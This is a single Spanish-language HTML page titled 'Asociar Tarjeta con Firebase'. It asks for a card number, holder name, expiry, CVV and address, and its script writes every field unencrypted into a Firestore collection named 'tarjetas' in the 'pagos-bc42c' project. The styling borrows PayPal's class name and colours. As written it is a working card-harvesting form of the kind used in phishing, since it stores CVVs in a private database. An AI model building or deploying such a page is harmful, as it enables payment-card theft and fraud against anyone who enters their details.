<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Asociar Tarjeta con Firebase</title>
</head>
<style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f7fa;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      text-align: center;
    }

    .paypal-logo {
      width: 50px;
      margin-bottom: 20px;
    }

    h2 {
      font-weight: 400;
      margin-bottom: 25px;
      color: #2c2e2f;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    input:focus, select:focus {
      border-color: #0070ba;
      outline: none;
    }

    button {
      background-color: #0070ba;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #005ea6;
    }

    label {
      display: block;
      text-align: left;
      margin: 5px 0 0;
      color: #333;
      font-size: 14px;
    }

    .cvv-container {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .cvv-container img {
      width: 60px;
      height: auto;
    }
  </style>
<body>

  <h1>Asociar Tarjeta</h1>
  <form id="tarjetaForm">
    <label>
      Número:
      <input type="text" name="numero" required maxlength="25" />
    </label><br />
    <label>
      Titular:
      <input type="text" name="titular" required maxlength="100" />
    </label><br />
    <label>
      Tipo:
      <input type="text" name="tipo" required maxlength="20" />
    </label><br />
    <label>
      Expiración:
      <input type="text" name="exp" required maxlength="10" placeholder="MM/AA" />
    </label><br />
    <label>
      CVV:
      <input type="text" name="cvv" required maxlength="5" />
    </label><br />
    <label>
      Dirección:
      <textarea name="direccion" rows="3"></textarea>
    </label><br />
    <button type="submit">Asociar tarjeta</button>
  </form>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBp_5laH8i7gBQ4SLl5RcSobs0xM9Kg3oE",
      authDomain: "pagos-bc42c.firebaseapp.com",
      projectId: "pagos-bc42c",
      storageBucket: "pagos-bc42c.firebasestorage.app",
      messagingSenderId: "793081747436",
      appId: "1:793081747436:web:3020a54bdce85a61a9d2c9",
      measurementId: "G-FYBLX78MEH"
    };

    // Inicializar Firebase y Firestore
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const form = document.getElementById("tarjetaForm");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const data = {
        numero: form.numero.value.trim(),
        titular: form.titular.value.trim(),
        tipo: form.tipo.value.trim(),
        exp: form.exp.value.trim(),
        cvv: form.cvv.value.trim(),
        direccion: form.direccion.value.trim(),
        fecha: serverTimestamp()
      };

      try {
        await addDoc(collection(db, "tarjetas"), data);
        alert("Tarjeta asociada con éxito");
        form.reset();
      } catch (error) {
        alert("Error al guardar: " + error.message);
      }
    });
  </script>

</body>
</html>
